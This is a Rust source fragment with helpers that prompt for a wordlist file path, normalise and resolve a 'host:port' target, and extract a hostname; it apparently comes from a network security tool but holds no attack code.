fn prompt_wordlist(prompt_text: &str) -> Result<String> {
    loop {
        let path = prompt(prompt_text);
        if path.is_empty() {
            println!("[!] Path cannot be empty.");
            continue;
        }
        let trimmed = path.trim();
        let candidate = Path::new(trimmed);
        if candidate.is_file() {
            return Ok(trimmed.to_string());
        } else {
            println!("[!] File '{}' does not exist or is not a file.", trimmed);
        }
    }
}

fn normalize_target(host: &str, default_port: u16) -> Result<String> {
    use once_cell::sync::Lazy;
    static TARGET_REGEX: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r"^\[*(?P<addr>[^\]]+?)\]*(?::(?P<port>\d{1,5}))?$")
        .expect("Invalid regex pattern")
    });

    let caps = TARGET_REGEX
    .captures(host.trim())
    .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;

    let addr = caps.name("addr").unwrap().as_str();
    let port = if let Some(m) = caps.name("port") {
        m.as_str()
        .parse::<u16>()
        .context("Invalid port value")?
    } else {
        default_port
    };

    let formatted = if addr.contains(':') && !addr.contains('.') {
        format!("[{}]:{}", addr, port)
    } else {
        format!("{}:{}", addr, port)
    };

    formatted
        .to_socket_addrs()
        .with_context(|| format!("Could not resolve {}", formatted))?
        .next()
        .ok_or_else(|| anyhow!("No addresses found for {}", formatted))?;

    Ok(formatted)
}

fn get_hostname(target: &str) -> String {
    target
    .trim()
    .trim_start_matches('[')
    .trim_end_matches(']')
    .split(':')
    .next()
    .unwrap_or(target)
    .to_string()
}
